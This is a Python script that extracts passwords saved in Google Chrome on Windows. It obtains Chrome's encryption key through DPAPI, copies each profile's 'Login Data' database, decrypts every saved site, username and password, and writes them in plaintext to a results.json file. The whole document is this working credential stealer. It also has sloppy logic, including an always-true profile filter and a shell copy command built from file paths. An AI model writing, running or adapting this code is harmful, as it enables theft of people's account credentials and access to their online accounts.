import os
import sqlite3
import json
import base64

import win32crypt
from Crypto.Cipher import AES

# Function to decrypt the encrypted Chrome passwords using the encryption key
def decrypt_password(ciphertext, key):
    try:
        # Chrome AES encryption uses GCM mode with an initialization vector (iv)
        iv = ciphertext[3:15]  # Extract IV from the encrypted password
        ciphertext = ciphertext[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
    except Exception as e:
        return f"Decryption failed: {str(e)}"

# Function to get the encryption key from the Chrome Local State file
def get_encryption_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state_data = json.load(f)

    # The key is stored in base64 format, and needs decryption with DPAPI
    encrypted_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]  # Remove DPAPI header and decrypt
    return decrypted_key

# Function to extract passwords from Chrome's 'Login Data' database
def get_chrome_passwords(database):
    db_path = database
    connection = sqlite3.connect(db_path)
    cursor = connection.cursor()

    # Query to fetch URLs, usernames, and encrypted passwords
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    login_data = cursor.fetchall()

    key = get_encryption_key()
    credentials = []

    for row in login_data:
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, key)

        # Store the credentials in a dictionary
        credentials.append({
            "url": url,
            "username": username,
            "password": decrypted_password.decode() if isinstance(decrypted_password, bytes) else "Failed to decrypt"
        })

    # Clean up database connection and remove temporary copy of the database
    cursor.close()
    connection.close()
    return credentials

def main():
    # Get the path to the Chrome database
    local_app_data = os.environ['LOCALAPPDATA']#app data locatioon in oc
    profile_paths = os.path.join(local_app_data, r'Google\Chrome\User Data')#folder where are the profiles folders
    poosible_profiles = os.listdir(profile_paths)#full route for the user profiles
    user_profiles = []#list of the user profiles

    #filters the profiles and removes the system and guest profiles
    for profile in poosible_profiles:
        if "Profile" or "Default" in profile:
            user_profiles.append(profile)
    for profile in user_profiles:
        match(profile):
            case "Guest Profile":
                user_profiles.remove(profile)
            case "System Profile":
                user_profiles.remove(profile)
    #if there are no user profiles found
    if len(user_profiles) == 0:
        print("No user profiles found")

    #checks that the user profiles are valid and ads them to a list valid_profiles full route stored
    else:
        valid_profiles = []
        for profile in user_profiles:
            profile_path = os.path.join(profile_paths, profile)
            if os.path.exists(profile_path):
                valid_profiles.append(profile_path)
    valid_profiles = [profile.replace("\\\\", "\\") for profile in valid_profiles]
    databases = []

    #checks if the database exists and adds it to the list databases
    for profile in valid_profiles:
        database_path = os.path.join(profile, r'Login Data')
        if os.path.exists(database_path):
            databases.append(database_path)
    #copys the database to a temporary location
    index = 0
    tempDatabases = []
    for database in databases:
        index += 1
        os.system(f'copy "{database}" "Login Data{index}.db"')
        tempDatabases.append(f"Login Data{index}.db")

    for database in tempDatabases:
        try:
            credentials = get_chrome_passwords(database)
            os.remove(database)
            if os.path.exists("results.json") and os.path.getsize("results.json") > 0:
                with open("results.json", "r+") as results_file:
                    data = json.load(results_file)
                    data.extend(credentials)
                    results_file.seek(0)
                    json.dump(data, results_file, indent=4)
            else:
                with open("results.json", "w") as results_file:
                    json.dump(credentials, results_file, indent=4)
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            continue

if __name__ == "__main__":
    main()
